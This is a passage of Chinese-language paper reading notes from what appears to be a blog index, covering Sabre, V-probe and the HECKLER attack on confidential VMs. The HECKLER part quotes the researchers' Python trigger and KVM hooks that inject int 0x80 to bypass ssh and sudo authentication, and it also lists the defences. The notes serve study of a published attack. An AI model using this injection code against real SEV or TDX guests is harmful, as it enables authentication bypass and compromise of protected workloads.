src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=NWM2MmE4YjM2NDU2Mjk5ODhhZWJjNWQzY2FlNTYwZjNfaWtvWlRhZ2lrcE01Q01JelFRMjNlemdzYjZleFVEYXRfVG9rZW46WE1GbmJoaHU2b0JJUWR4TWVvQ2NIRkVpbmhlXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA\" alt=\"img\"></p>\n<p>Working set对于一个固定的应用来说是不变的，sabre压缩了WS file 所以性能更好了</p>\n<p>以cnn-image-classification为例，压缩比为3.10 prefetch加速38.73% 又因为该场景中REAP prefetch耗时占比大 最终Sabre达到19.2%的优势</p>\n<p>对function invocation占比大的场景优势不明显（这个serverless函数本身启动耗时）</p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=MDBiYzUxYWE0NTg0ZmM3YjIxNDZjM2FjYjU0ZDdiMmFfYzc0Tm1abU9LbzhUSDdJbk96MnUyMmFsdU9ET0NkeGFfVG9rZW46RWc3VmJsbXFwb1JOM0h4aUdsbmNzQnVMbkdkXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA\" alt=\"img\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>创新地提出把硬件加速器IAA应用于压缩VM snapshot，并通过合理的设计成功加速了microVM cold start</p>\n<h2 id=\"启发\"><a href=\"#启发\" class=\"headerlink\" title=\"启发\"></a>启发</h2><ol>\n<li>IAA加速压缩&#x2F;解压是否可以应用在其他场景中？ (有正在进行的VM migration的工作<a href=\"https://lore.kernel.org/all/20240319164527.1873891-1-yuan1.liu@intel.com/T/%EF%BC%89\">https://lore.kernel.org/all/20240319164527.1873891-1-yuan1.liu@intel.com/T/）</a></li>\n<li>探索新硬件提供的其他功能</li>\n</ol>\n<ul>\n<li>IAA：加密、CRC offload、data filtering等<a href=\"https://www.intel.com/content/www/us/en/content-details/721858/intel-in-memory-analytics-accelerator-architecture-specification.html\">https://www.intel.com/content/www/us/en/content-details/721858/intel-in-memory-analytics-accelerator-architecture-specification.html</a></li>\n<li>其他硬件 例如DLB<a href=\"https://www.intel.cn/content/www/cn/zh/products/docs/processors/xeon-accelerated/4th-gen-xeon-scalable-processors-product-brief.html\">https://www.intel.cn/content/www/cn/zh/products/docs/processors/xeon-accelerated/4th-gen-xeon-scalable-processors-product-brief.html</a></li>\n</ul>\n","categories":["papers"]},{"title":"V-probe","url":"/2024/09/17/papers/V-probe/","content":"<h1 id=\"V-probe\"><a href=\"#V-probe\" class=\"headerlink\" title=\"V-probe\"></a>V-probe</h1><p>ATC23</p>\n<h2 id=\"问题与目标\"><a href=\"#问题与目标\" class=\"headerlink\" title=\"问题与目标\"></a>问题与目标</h2><p>IO直通的DMA操作与memory overcommitment产生冲突</p>\n<p>因为DMA操作需要保证内存是固定不变的  overcommitment需要动态调整</p>\n<p>现有方案：</p>\n<ul>\n<li>IOPF：DMA会产生pagefault，依赖memory reclaim ，swap慢 balloon通信慢 hyperupcall可能回收了DMA缓冲区导致失败</li>\n<li>vIOMMU coIOMMU 让hypervisor 知道VM的DMA信息 兼容性差</li>\n</ul>\n<p>希望</p>\n<ul>\n<li>保证DMA不会失败</li>\n<li>不需要特殊硬件</li>\n<li>不需要修改guest内核</li>\n<li>性能好</li>\n</ul>\n<h2 id=\"方法\"><a href=\"#方法\" class=\"headerlink\" title=\"方法\"></a>方法</h2><p>类似hyperupcall 但是用编译好的二进制</p>\n<p>guest启动后动态加载</p>\n<p>限制只能用rdi rax 不允许访问内存 不允许大于64bytes  不能跳转</p>\n<p>关于page：</p>\n<p><a href=\"https://blog.csdn.net/zhoutaopower/article/details/87090982\">Linux 内存管理窥探（5）：page 数据结构_爱洋葱的博客-CSDN博客</a></p>\n<p><a href=\"http://linux.laoqinren.net/kernel/memory-page/\">struct page结构体 - Notes about linux and my work (laoqinren.net)</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/573338379\">linux内核那些事之struct page - 知乎 (zhihu.com)</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_MAPCOUNT_OPS(uname, lname)\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">static __always_inline int Page##uname(struct page *page)\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">&#123;\t\t\t\t\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\treturn atomic_read(&amp;page-&gt;_mapcount) ==\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t\t\t\tPAGE_##lname##_MAPCOUNT_VALUE;\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">&#125;\t\t\t\t\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">static __always_inline void __SetPage##uname(struct page *page)\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">&#123;\t\t\t\t\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\tVM_BUG_ON_PAGE(atomic_read(&amp;page-&gt;_mapcount) != -1, page);\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\tatomic_set(&amp;page-&gt;_mapcount, PAGE_##lname##_MAPCOUNT_VALUE);\t\\</span></span><br><span class=\"line\"><span class=\"meta\">&#125;\t\t\t\t\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">static __always_inline void __ClearPage##uname(struct page *page)\t\\</span></span><br><span class=\"line\"><span class=\"meta\">&#123;\t\t\t\t\t\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\tVM_BUG_ON_PAGE(!Page##uname(page), page);\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\tatomic_set(&amp;page-&gt;_mapcount, -1);\t\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * PageBuddy() indicate that the page is free and in the buddy system</span></span><br><span class=\"line\"><span class=\"comment\"> * (see mm/page_alloc.c).</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_BUDDY_MAPCOUNT_VALUE\t\t(-128)</span></span><br><span class=\"line\">PAGE_MAPCOUNT_OPS(Buddy, BUDDY)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> page_private(page)\t\t((page)-&gt;private)</span></span><br></pre></td></tr></table></figure>\n\n<p>一个用于拿是否free 一个用于拿order</p>\n<p>这些函数的参数都是page结构体的GVA，所以注册函数的同时需要把guest内核page存放的GPA也一同放入</p>\n<p>由于代码在host上执行，不需要GVA-&gt;GPA 所以这段代码不论是GPA-&gt;HVA还是如何翻译 总能在hypervisor上解决</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"> procedure MEMORYRECLAMATION</span><br><span class=\"line\"><span class=\"number\">2</span>: <span class=\"keyword\">for</span> each GFN in GUEST <span class=\"keyword\">do</span></span><br><span class=\"line\"><span class=\"number\">3</span>: <span class=\"keyword\">if</span> GFN is reclaimed then</span><br><span class=\"line\"><span class=\"number\">4</span>: <span class=\"keyword\">continue</span></span><br><span class=\"line\"><span class=\"number\">5</span>: SP ← <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> <span class=\"title\">of</span> <span class=\"title\">GFN</span> <span class=\"title\">in</span> <span class=\"title\">GUEST</span></span></span><br><span class=\"line\"><span class=\"class\">6:</span> FREE ← GUEST.PAGE_FREE(SP)</span><br><span class=\"line\"><span class=\"number\">7</span>: ORD ← GUEST.PAGE_ORD(SP)</span><br><span class=\"line\"><span class=\"number\">8</span>: <span class=\"keyword\">if</span> FREE and ORD ≥ MIN_ORD then</span><br><span class=\"line\"><span class=\"number\">9</span>: Lock MUTEX</span><br><span class=\"line\"><span class=\"number\">10</span>: Make the <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> <span class=\"title\">GPA</span> <span class=\"title\">range</span> <span class=\"title\">read</span>-<span class=\"title\">only</span></span></span><br><span class=\"line\"><span class=\"class\">11:</span> SP′ ← <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> <span class=\"title\">of</span> <span class=\"title\">GFN</span> <span class=\"title\">in</span> <span class=\"title\">GUEST</span></span></span><br><span class=\"line\"><span class=\"class\">12:</span> FREE′ ← GUEST.PAGE_FREE(SP′)</span><br><span class=\"line\"><span class=\"number\">13</span>: ORD′ ← GUEST.PAGE_ORD(SP′)</span><br><span class=\"line\"><span class=\"number\">14</span>: <span class=\"keyword\">if</span> FREE′ and ORD′ ≥ MIN_ORD then</span><br><span class=\"line\"><span class=\"number\">15</span>: GFNst ← GFN</span><br><span class=\"line\"><span class=\"number\">16</span>: GFNen ← GFN + (<span class=\"number\">1</span> &lt;&lt; ORD′)</span><br><span class=\"line\"><span class=\"number\">17</span>: RANGE ← [GFNst, GFNen)</span><br><span class=\"line\"><span class=\"number\">18</span>: Unmap EPT in RANGE</span><br><span class=\"line\"><span class=\"number\">19</span>: Unmap IOMMU in RANGE</span><br><span class=\"line\"><span class=\"number\">20</span>: Add RANGE to the reclaimed <span class=\"built_in\">set</span></span><br><span class=\"line\"><span class=\"number\">21</span>: Release reclaimed pages to hypervisor</span><br><span class=\"line\"><span class=\"number\">22</span>: Unlock MUTEX</span><br><span class=\"line\"><span class=\"number\">23</span>: <span class=\"keyword\">return</span> SUCCESS</span><br><span class=\"line\"><span class=\"number\">24</span>: Make the <span class=\"keyword\">struct</span> page GPA range read-write</span><br><span class=\"line\"><span class=\"number\">25</span>: Unlock MUTEX</span><br><span class=\"line\"><span class=\"number\">26</span>: <span class=\"keyword\">return</span> FAIL</span><br></pre></td></tr></table></figure>\n\n<p>记录到reclaimed set中 并且解除映射</p>\n<p>一旦解除映射 对应的物理内存就空出来了 满足overcommitment</p>\n<p>回收代码定时触发或者事件触发</p>\n<p>我认为第21行需要完成两件事</p>\n<ul>\n<li>这里光解除映射 实际上host还是不可用 需要用host kernel的对应函数和数据结构修改  但是已经运行在host上 并且知道guest的所有信息 并不难做到(类似qemu 可用madvise) 但是否有不一致问题？</li>\n<li>修改guest struct page 标记不可用 否则guest当作free仍然分配并使用 可能导致触发大量page fault和VMexit</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"> procedure PAGEFAULTHANDLER</span><br><span class=\"line\"><span class=\"number\">2</span>: Lock MUTEX</span><br><span class=\"line\"><span class=\"number\">3</span>: RANGE ← GetReclaimedRange(GUEST , GPA)</span><br><span class=\"line\"><span class=\"number\">4</span>: PAGES ← pages reallocated <span class=\"keyword\">for</span> RANGE</span><br><span class=\"line\"><span class=\"number\">5</span>: Map RANGE to PAGES in EPT</span><br><span class=\"line\"><span class=\"number\">6</span>: Map RANGE to PAGES in IOMMU</span><br><span class=\"line\"><span class=\"number\">7</span>: Remove RANGE from the reclaimed <span class=\"built_in\">set</span></span><br><span class=\"line\"><span class=\"number\">8</span>: Make the <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> <span class=\"title\">GPA</span> <span class=\"title\">range</span> <span class=\"title\">read</span>-<span class=\"title\">write</span></span></span><br><span class=\"line\"><span class=\"class\">9:</span> Unlock MUTEX</span><br><span class=\"line\"><span class=\"number\">10</span>: <span class=\"keyword\">return</span></span><br><span class=\"line\">Input: GUEST , GPA</span><br><span class=\"line\">Output: RANGE</span><br><span class=\"line\"><span class=\"number\">11</span>: procedure GETRECLAIMEDRANGE</span><br><span class=\"line\"><span class=\"number\">12</span>: <span class=\"keyword\">for</span> each RANGE in the reclaimed <span class=\"built_in\">set</span> of GUEST <span class=\"keyword\">do</span></span><br><span class=\"line\"><span class=\"number\">13</span>: SPst ← the start <span class=\"keyword\">struct</span> page GPA in RANGE</span><br><span class=\"line\"><span class=\"number\">14</span>: SPen ← the end <span class=\"keyword\">struct</span> page GPA in RANGE</span><br><span class=\"line\"><span class=\"number\">15</span>: <span class=\"keyword\">if</span> SPst ≤ GPA ≤ SPen then</span><br><span class=\"line\"><span class=\"number\">16</span>: <span class=\"keyword\">return</span> RANGE</span><br></pre></td></tr></table></figure>\n\n<p>DMA发生page fault 需要重新拿回对应的物理内存</p>\n<p>这时候从reclaimed set中寻找原来的地址判断长度 然后重新映射 保证了DMA用的HPA虽然在动态变化但是仍可用 </p>\n<p>这里的两个函数应该都是加到hypervisor代码中去的(修改host内核)</p>\n<p>普通的page fault和DMA的page fault都使用这个函数</p>\n<p>所以具体实现上仍然需要支持IOPF的硬件  实验中作者是自己修改硬件来支持的</p>\n<h2 id=\"并发\"><a href=\"#并发\" class=\"headerlink\" title=\"并发\"></a>并发</h2><h3 id=\"host与guest\"><a href=\"#host与guest\" class=\"headerlink\" title=\"host与guest\"></a>host与guest</h3><p>把host需要回收的page结构体都改为read only 随后再进行检查 这样做保证了满足要求的page都不会被guest修改</p>\n<h3 id=\"reclaim与page-fault\"><a href=\"#reclaim与page-fault\" class=\"headerlink\" title=\"reclaim与page fault\"></a>reclaim与page fault</h3><p>用host自己的mutex lock</p>\n<h2 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h2><p>这篇文章相当于设备直通场景下的hypercall 因此测试除了常规回收内存之外 还增加了特定的IO测试</p>\n<p>例如tcp udp和redis</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>不管guest怎么操作自己的数据结构 入口一定是在host的</p>\n<p>必须保证host拥有guest数据结构的地址和布局 并且提供给这段代码才可以</p>\n<p>代码其实是修改了host自己的reclaim和page fault逻辑自己执行 不需要VM enter和exit</p>\n<p>这种方式和balloon完全不同 不需要guest自己任何参与 对guest来说 仍然认为自己有着全部内存 不知道二级页表映射已经失效了</p>\n<ul>\n<li>balloon：guest判断free guest标记不可用 host unmap</li>\n<li>v-probe：host判断free (host标记guest不可用) host unmap</li>\n</ul>\n<p>v-probe就算不顺带解决IOPF的问题 从性能上单独来说也是碾压balloon的，因为通过在host访问guest数据结构绕开了virtio这个大框架</p>\n","categories":["papers"]},{"title":"HECKLER: Breaking Confidential VMs with Malicious Interrupts  ","url":"/2024/06/02/papers/HECKLER/","content":"<p><a href=\"https://github.com/ahoi-attacks/heckler\">ahoi-attacks&#x2F;heckler: Breaking Confidential VMs with Malicious Interrupts (USENIX Security 2024) (github.com)</a></p>\n<h1 id=\"HECKLER-Breaking-Confidential-VMs-with-Malicious-Interrupts\"><a href=\"#HECKLER-Breaking-Confidential-VMs-with-Malicious-Interrupts\" class=\"headerlink\" title=\"HECKLER: Breaking Confidential VMs with Malicious Interrupts\"></a>HECKLER: Breaking Confidential VMs with Malicious Interrupts</h1><h2 id=\"syscall\"><a href=\"#syscall\" class=\"headerlink\" title=\"syscall\"></a>syscall</h2><p>32 使用int 0x80 通过中断实现系统调用</p>\n<p>64 syscall指令不通过中断实现</p>\n<p><a href=\"https://sdww0.github.io/2023/03/09/x86_64-%E4%B8%AD%E6%96%AD-%E5%BC%82%E5%B8%B8%E4%B8%8Esyscall/\">x86_64-中断，异常与syscall | sdww0的博客</a></p>\n<p><a href=\"https://maodanp.github.io/2019/05/26/linux-syscall/\">Linux的系统调用 (maodanp.github.io)</a></p>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><p>中断有很多种 恶意VMM可以向CVM自由注入虚拟中断</p>\n<ul>\n<li>SEV 所有虚拟中断都会被成功转发给CVM执行 并且有些是可以转发给用户态自定义的信号处理函数的</li>\n<li>TDX 中断号小于31的会被硬件过滤掉（除了NMI）</li>\n</ul>\n<p>附录Table 6 中断号0x80就是syscall  后续按syscall处理 从eax等寄存器中拿参数 然后eax放返回值 然后返回cvm的pc</p>\n<h2 id=\"攻击\"><a href=\"#攻击\" class=\"headerlink\" title=\"攻击\"></a>攻击</h2><p>恶意VMM向CVM注入syscall的虚拟中断int 0x80</p>\n<p>假如guest 有个gadget是准备eax ecx等参数</p>\n<p>恶意VMM注入一个int 0x80 (假设guest准备好的eax是4 buf是共享内存)</p>\n<p>那么CVM就会在自己的中断处理函数中把secret写出来</p>\n<p>实际上很难找这种gadget 所以只找了 参数和返回值都是仅有eax的  40&#x2F;328</p>\n<p>目标是改eax 怎么改？ 利用错误代码  syscall 0表示重启 userspace会报错 这样eax就是-4 可以绕过ssh检查</p>\n<p><a href=\"https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_32.tbl\">linux&#x2F;arch&#x2F;x86&#x2F;entry&#x2F;syscalls&#x2F;syscall_32.tbl at master · torvalds&#x2F;linux (github.com)</a></p>\n<p><a href=\"https://www.onitroad.com/jc/linux/man-pages/linux/man2/restart_syscall.2.html\">RESTART_SYSCALL - Linux手册页-之路教程 (onitroad.com)</a></p>\n<p>巧合：</p>\n<ol>\n<li>ssh返回值非零表示通过检查</li>\n<li>syscall在报错的时候会返回非零值</li>\n</ol>\n<p>int 0x0是FPE 例如除0 溢出等 用户自定义处理函数</p>\n<p>如果这些处理函数改变了程序某些状态 例如一个变量 那可以被恶意VMM利用</p>\n<h2 id=\"实际使用\"><a href=\"#实际使用\" class=\"headerlink\" title=\"实际使用\"></a>实际使用</h2><p>哪里注入？ 如何判断？</p>\n<p>第六章 第七章 附录A</p>\n<p>为了定位需要注入攻击的代码页位置 需要提前profile</p>\n<ol>\n<li>启动阶段记录page 这些page是需要被排除的</li>\n<li>尝试很多遍需要攻击的application(例如很多次ssh) 拿到一个固定的page序列</li>\n</ol>\n<p>通过page fault拿到这个page序列</p>\n<p>当ssh验证的时候 访问page的序列是固定的  数第几个是预期的然后插入就行</p>\n<ol>\n<li>offline phase：离线采样 拿到page序列</li>\n<li>online phase：在线采样 找到需要插入中断的位置</li>\n<li>inject interrupt：插入中断</li>\n</ol>\n<p>page序列如何找到两个gadget？</p>\n<p>ssh：</p>\n<p>sudo：写一个C程序调用PAM module(.so)就可以了 循环访问这两个page</p>\n<p><a href=\"https://github.com/ahoi-attacks/heckler/blob/master/userspace/sudo/profile_pam.c\">heckler&#x2F;userspace&#x2F;sudo&#x2F;profile_pam.c at master · ahoi-attacks&#x2F;heckler (github.com)</a></p>\n<p>sudo不需要offline学fapp的过程 只要ssh成功以后用自己跑的程序循环访问 然后看频率最高的两个就可以了</p>\n<p>判断GPA相同  要求进程不变 </p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"> mm_answer_authpassword = gadgets[<span class=\"number\">0</span>]</span><br><span class=\"line\"> auth_password = gadgets[<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># sequence of interest:</span></span><br><span class=\"line\"><span class=\"comment\"># mm_answer_authpassword -&gt; auth_password -&gt; mm_answer_authpassword</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> gpa == mm_answer_authpassword \\</span><br><span class=\"line\"><span class=\"keyword\">and</span> last_gpa == auth_password \\</span><br><span class=\"line\"><span class=\"keyword\">and</span> lastlast_gpa == mm_answer_authpassword:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Injecting interrupt, sequence &quot;</span></span><br><span class=\"line\">    <span class=\"string\">f&quot;\\[<span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(lastlast_gpa)&#125;</span>, <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(last_gpa)&#125;</span>, <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(gpa)&#125;</span>]&quot;</span>)</span><br><span class=\"line\">    h.heckler_inject(<span class=\"number\">0x80</span>)</span><br></pre></td></tr></table></figure>\n\n<p>ssh使用sshd</p>\n<p>sudo使用一个共享库</p>\n<blockquote>\n<p>It uses PAM to perform password authentication by calling the pam_unix shared library which has our code gadget from Sec. 5. The Linux kernel executes shared libraries from the same physical addresses.  </p>\n</blockquote>\n<p>插入中断代码 用的是sev-step提供的框架   通过ioctl 处理 然后kvm_dev_ioctl处理</p>\n<p><a href=\"https://github.com/ahoi-attacks/heckler/blob/master/userspace/sev-step/sev-step-lib/sev_step_api.c#L241\">heckler&#x2F;userspace&#x2F;sev-step&#x2F;sev-step-lib&#x2F;sev_step_api.c at master · ahoi-attacks&#x2F;heckler (github.com)</a></p>\n<p><a href=\"https://github.com/ahoi-attacks/heckler-linux/commit/0aa0129654ddbcdb5043fde1229b710799da2f6f\">heckler: introduce nx page fault and track · ahoi-attacks&#x2F;heckler-linux@0aa0129 (github.com)</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">heckler_config.do_inject_vector = <span class=\"number\">1</span>;</span><br><span class=\"line\">heckler_config.inject_vector = inj.<span class=\"built_in\">vector</span>;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">heckler_on_svm_vcpu_enter_exit</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span> &#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">vcpu_svm</span> *<span class=\"title\">svm</span> =</span> to_svm(vcpu);</span><br><span class=\"line\">    u64 fault_address = svm-&gt;vmcb-&gt;control.exit_info_2;</span><br><span class=\"line\"></span><br><span class=\"line\">    mutex_lock(&amp;heckler_config.config_mutex);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (heckler_config.do_inject_vector == <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">        heckler_config.do_inject_vector = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        pr_info(<span class=\"string\">&quot;apic clear isr: interrupt: %d\\n&quot;</span>,</span><br><span class=\"line\">            heckler_config.inject_vector);</span><br><span class=\"line\"></span><br><span class=\"line\">        kvm_apic_clear_irr(vcpu, heckler_config.inject_vector);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (svm-&gt;vmcb-&gt;control.exit_code == SVM_EXIT_NPF &amp;&amp;</span><br><span class=\"line\">        heckler_config.do_inject_vector == <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        heckler_config.do_inject_vector = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        pr_info(<span class=\"string\">&quot;injecting: vector: %d, npf: %llx\\n&quot;</span>,</span><br><span class=\"line\">                heckler_config.inject_vector, fault_address);</span><br><span class=\"line\"></span><br><span class=\"line\">        svm-&gt;vmcb-&gt;control.event_inj = heckler_config.inject_vector |</span><br><span class=\"line\">            SVM_EVTINJ_VALID |</span><br><span class=\"line\">            SVM_EVTINJ_TYPE_INTR;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    mutex_unlock(&amp;heckler_config.config_mutex);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>run之前插入中断</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">heckler_on_svm_vcpu_enter_exit(vcpu);</span><br><span class=\"line\">svm_vcpu_enter_exit(vcpu);</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"防御\"><a href=\"#防御\" class=\"headerlink\" title=\"防御\"></a>防御</h2><p>看上一个pc是不是int 0x80</p>\n<p>直接把32位的模拟给禁止了</p>\n<p><a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b82a8dbd3d2f4563156f7150c6f2ecab6e960b30\">x86&#x2F;coco: Disable 32-bit emulation by default on TDX and SEV - kernel&#x2F;git&#x2F;torvalds&#x2F;linux.git - Linux kernel source tree</a></p>\n<p><a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4116bfc44621882556bbf70f5284fbf429a5cf6\">x86&#x2F;tdx: Allow 32-bit emulation by default - kernel&#x2F;git&#x2F;torvalds&#x2F;linux.git - Linux kernel source tree</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __init idt _setup_traps(<span class=\"type\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tidt_setup_from_table(idt_table, def_idts, ARRAY_SIZE(def_idts), <span class=\"literal\">true</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (ia32_enabled())</span><br><span class=\"line\">\t\tidt_setup_from_table(idt_table, ia32_idt, ARRAY_SIZE(ia32_idt), <span class=\"literal\">true</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p><a href=\"https://www.amd.com/content/dam/amd/en/documents/processor-tech-docs/programmer-references/24593.pdf\">24593.pdf (amd.com)</a></p>\n<p>15.36.16</p>\n<p><a href=\"https://www.amd.com/en/resources/product-security/bulletin/amd-sb-3008.html\">Disrupting AMD SEV-SNP on Linux® With Interrupts</a></p>\n<p>认为是软件实现的问题</p>\n<p>SNP-guest可以自己设置一个feature bit来达到restricted injection只允许一个新的中断#HV</p>\n<p>然后guest内的#HV handler处理中断</p>\n<p>但是只转发不过滤还是没用的 还是可能转发一个inx 0x80做syscall</p>\n<h2 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h2><p>python模块和kvm的通信也是通过sev step</p>\n<p>kvm:</p>\n<p>kvm_tdp_mmu_page_fault-&gt;page_fault_handle_page_track-&gt;heckler_on_page_fault</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">heckler_on_page_fault</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"keyword\">struct</span> kvm_page_fault *fault)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> active = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_memory_slot</span> *<span class=\"title\">slot</span>;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    slot = kvm_vcpu_gfn_to_memslot(vcpu, fault-&gt;gfn);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (slot != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        active = kvm_slot_page_track_is_active(vcpu-&gt;kvm,</span><br><span class=\"line\">                                               slot,</span><br><span class=\"line\">                                               fault-&gt;gfn,</span><br><span class=\"line\">                                               KVM_PAGE_TRACK_EXEC);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (active) &#123;</span><br><span class=\"line\">            __do_untrack_single_page(vcpu,</span><br><span class=\"line\">                                     fault-&gt;gfn);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> 0</span></span><br><span class=\"line\">            kvm_vcpu_exec_unprotect_gfn(vcpu,</span><br><span class=\"line\">                                        fault-&gt;gfn,</span><br><span class=\"line\">                                        <span class=\"literal\">true</span>);</span><br><span class=\"line\">            __clear_nx_on_page(vcpu,</span><br><span class=\"line\">                               fault-&gt;gfn);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    pr_info(<span class=\"string\">&quot;c:%d active: %d pf: %llx x:%d p:%d w:%d u:%d &quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;rsvd %d pref:%d tdp:%d\\n&quot;</span>,</span><br><span class=\"line\">            uspt_ctx != <span class=\"literal\">NULL</span>, active, fault-&gt;addr, fault-&gt;exec,</span><br><span class=\"line\">            fault-&gt;present, fault-&gt;write, fault-&gt;user, fault-&gt;rsvd,</span><br><span class=\"line\">            fault-&gt;prefetch, fault-&gt;is_tdp);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (uspt_ctx == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (active) &#123;</span><br><span class=\"line\">        <span class=\"type\">usp_page_fault_event_t</span> pf_event = &#123;</span><br><span class=\"line\">            .faulted_gpa = (<span class=\"type\">uint64_t</span>)(fault-&gt;addr),</span><br><span class=\"line\">            .is_decrypted_vmsa_data_valid = <span class=\"literal\">false</span>,</span><br><span class=\"line\">            .has_vmsa_blob = <span class=\"number\">0</span>,</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        ret = usp_send_and_block(uspt_ctx,</span><br><span class=\"line\">                                 PAGE_FAULT_EVENT,</span><br><span class=\"line\">                                 (<span class=\"type\">void</span> *)&amp;pf_event);</span><br><span class=\"line\">        <span class=\"keyword\">switch</span> (ret) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"number\">2</span>: &#123;</span><br><span class=\"line\">                pr_info(<span class=\"string\">&quot;usp_send_and_block aborted due to force_reset\\n&quot;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span 